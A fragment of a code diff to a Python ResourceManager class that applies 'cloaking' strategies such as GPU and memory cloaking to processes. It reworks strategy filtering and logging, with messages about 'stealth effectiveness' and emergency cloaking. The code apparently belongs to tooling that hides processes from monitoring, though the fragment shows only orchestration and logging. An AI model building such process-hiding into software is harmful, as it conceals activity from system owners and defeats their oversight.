+                        self.logger.warning(f"⚠️ [PHASE1-RISK] No coordination + no fallback cho PID={pid} - high risk mode")
                     
                     # **Strategy processing started** (bắt đầu xử lý chiến lược)
                     self.logger.debug(f"Processing {len(strategies)} strategies for PID={pid}, coordination: {coordination_verified}")
                     
                     for strat in strategies:
                         try:
-                            # ✅ MEMORY-SAFE STRATEGY FILTERING: Skip memory-intensive strategies if not coordinated
-                            if not coordination_verified and strat in ['gpu_cloaking', 'memory']:
-                                self.logger.warning(f"⚠️ [MEMORY-SAFETY] Strategy {strat} blocked - no coordination (memory risk)")
-                                # ✅ ENHANCED RECOVERY: Try one more time to establish coordination
-                                try:
-                                    from coordinator import get_hook_coordinator
-                                    coordinator = get_hook_coordinator()
-                                    # Force-register and notify if needed
-                                    if pid not in getattr(coordinator, 'hooks_ready', {}):
-                                        coordinator.register_pid(pid)
-                                        coordinator.notify_hooks_ready(pid)
-                                        self.logger.info(f"🔄 [RECOVERY] Emergency coordination established for PID {pid}")
-                                        coordination_verified = True
-                                    elif coordinator.check_hooks_ready(pid):
-                                        coordination_verified = True
-                                        self.logger.info(f"🔄 [RECOVERY] Coordination now verified for PID {pid}")
-                                except Exception as recovery_err:
-                                    self.logger.error(f"❌ [RECOVERY] Emergency coordination failed: {recovery_err}")
-                                
-                                # If still not coordinated, skip the strategy
-                                if not coordination_verified:
-                                    strategy_results['failed'].append(strat)
-                                    continue
+                            # **PHASE 1: Enhanced Memory-Safe Strategy Filtering** (lọc chiến lược an toàn bộ nhớ nâng cao)
+                            strategy_safe = True
+                            skip_reason = None
+                            
+                            # **High-risk strategy check** (kiểm tra chiến lược nguy hiểm cao)
+                            if strat in ['gpu_cloaking', 'memory'] and not coordination_verified:
+                                if fallback_mode:
+                                    # **Fallback mode allows limited memory strategies** (chế độ fallback cho phép chiến lược bộ nhớ hạn chế)
+                                    memory_pressure = self.monitor_memory_pressure()
+                                    if memory_pressure['pressure_level'] in ['LOW', 'MODERATE']:
+                                        self.logger.info(f"🔄 [PHASE1-FALLBACK] Strategy {strat} allowed in fallback mode - low memory pressure")
+                                    else:
+                                        strategy_safe = False
+                                        skip_reason = f"fallback_high_memory_pressure_{memory_pressure['pressure_level']}"
                                 else:
-                                    self.logger.info(f"✅ [RECOVERY] Strategy {strat} now allowed - coordination recovered")
+                                    # **Non-fallback mode requires coordination** (chế độ không phải fallback yêu cầu coordination)
+                                    strategy_safe = False
+                                    skip_reason = "no_coordination_high_risk_strategy"
+                            
+                            if not strategy_safe:
+                                self.logger.warning(f"⚠️ [PHASE1-SAFETY] Strategy {strat} blocked - {skip_reason}")
+                                strategy_results['failed'].append(strat)
+                                continue
+                            
+                            # **PHASE 1: Strategy allowed - proceed** (chiến lược được cho phép - tiến hành)
+                            self.logger.debug(f"✅ [PHASE1-ALLOW] Strategy {strat} approved cho PID={pid}")
                             
                             # ✅ INTELLIGENT CACHING: Use advanced cache system
                             creation_start = time.time()
@@ -1701,40 +2104,66 @@ class ResourceManager(IResourceManager):
                     if applied_count > 0:
                         self.process_states[pid] = "cloaked"
                         success_level = "FULL" if failed_count == 0 else "PARTIAL"
-                        self.logger.info(f"✅ [{success_level}] {process_type} PID={pid} cloaked: {applied_count}/{strategy_results['total']} strategies ({success_rate:.1f}% success rate)")
-                        self.logger.info(f"📊 Applied: {strategy_results['applied']}")
                         
-                        # ✅ METRICS TRACKING: Record success metrics for monitoring
+                        # **PHASE 1: Enhanced success reporting** (báo cáo thành công nâng cao)
+                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "high_risk")
+                        self.logger.info(f"✅ [PHASE1-SUCCESS] {success_level} {task_type} completed cho PID={pid}")
+                        self.logger.info(f"🎯 [PHASE1-STATS] Mode: {cloaking_mode}, Success: {applied_count}/{strategy_results['total']} ({success_rate:.1f}%)")
+                        self.logger.info(f"📊 [PHASE1-APPLIED] Strategies: {strategy_results['applied']}")
+                        
+                        # **PHASE 1: Enhanced metrics tracking** (theo dõi metrics nâng cao)
                         self._record_strategy_metrics(pid, 'success', {
                             'applied_count': applied_count,
                             'total_count': strategy_results['total'],
                             'success_rate': success_rate,
                             'primary_applied': primary_applied,
-                            'strategies': strategy_results['applied']
+                            'strategies': strategy_results['applied'],
+                            'coordination_status': coordination_verified,
+                            'fallback_mode': fallback_mode,
+                            'task_type': task_type,
+                            'cloaking_mode': cloaking_mode
                         })
                         
                         if failed_count > 0:
-                            self.logger.warning(f"⚠️ Failed strategies: {strategy_results['failed']}")
+                            self.logger.warning(f"⚠️ [PHASE1-FAILED] Failed strategies: {strategy_results['failed']}")
                             
-                        # ✅ PRIMARY STRATEGY SUCCESS CHECK
+                        # **PHASE 1: Enhanced primary strategy check** (kiểm tra chiến lược chính nâng cao)
                         if primary_applied:
-                            self.logger.info(f"🎯 Primary strategy '{primary_strategy}' successfully applied")
+                            self.logger.info(f"🎯 [PHASE1-PRIMARY] Primary strategy '{primary_strategy}' successfully applied")
                         else:
-                            self.logger.warning(f"🚨 Primary strategy '{primary_strategy}' failed - reduced stealth effectiveness")
+                            # **Different handling based on mode** (xử lý khác nhau dựa trên chế độ)
+                            if fallback_mode:
+                                self.logger.info(f"🔄 [PHASE1-PRIMARY] Primary strategy '{primary_strategy}' failed in fallback mode - expected")
+                            else:
+                                self.logger.warning(f"🚨 [PHASE1-PRIMARY] Primary strategy '{primary_strategy}' failed - reduced stealth effectiveness")
                     else:
-                        # ✅ COMPLETE FAILURE: All strategies failed
+                        # **PHASE 1: Enhanced complete failure handling** (xử lý thất bại hoàn toàn nâng cao)
                         self.process_states[pid] = "cloaking_failed"
-                        self.logger.error(f"❌ [FAILED] No strategies applied for {process_type} PID={pid} (0% success rate)")
-                        self.logger.error(f"💀 All strategies failed: {strategy_results['failed']}")
+                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "high_risk")
                         
-                        # ✅ METRICS TRACKING: Record failure metrics for monitoring
+                        self.logger.error(f"❌ [PHASE1-FAILED] Complete {task_type} failure cho PID={pid}")
+                        self.logger.error(f"💀 [PHASE1-FAILED] Mode: {cloaking_mode}, Success: 0/{strategy_results['total']} (0% rate)")
+                        self.logger.error(f"💀 [PHASE1-FAILED] All strategies failed: {strategy_results['failed']}")
+                        
+                        # **PHASE 1: Enhanced failure metrics** (metrics thất bại nâng cao)
                         self._record_strategy_metrics(pid, 'failure', {
                             'failed_count': failed_count,
                             'total_count': strategy_results['total'],
                             'success_rate': 0.0,
                             'primary_applied': False,
-                            'strategies': strategy_results['failed']
+                            'strategies': strategy_results['failed'],
+                            'coordination_status': coordination_verified,
+                            'fallback_mode': fallback_mode,
+                            'task_type': task_type,
+                            'cloaking_mode': cloaking_mode,
+                            'failure_mode': 'complete_failure'
                         })
+                        
+                        # **PHASE 1: Failure recovery suggestion** (gợi ý khôi phục thất bại)
+                        if not fallback_mode and task_type != 'emergency_cloak':
+                            self.logger.warning(f"💡 [PHASE1-RECOVERY] Consider manual intervention or emergency fallback cho PID={pid}")
+                        elif task_type == 'emergency_cloak':
+                            self.logger.critical(f"🚨 [PHASE1-CRITICAL] Emergency cloaking failed - system may be compromised cho PID={pid}")
                 
                 # ✅ CACHE METRICS: Periodic cache performance logging
                 self._log_cache_metrics_if_needed()
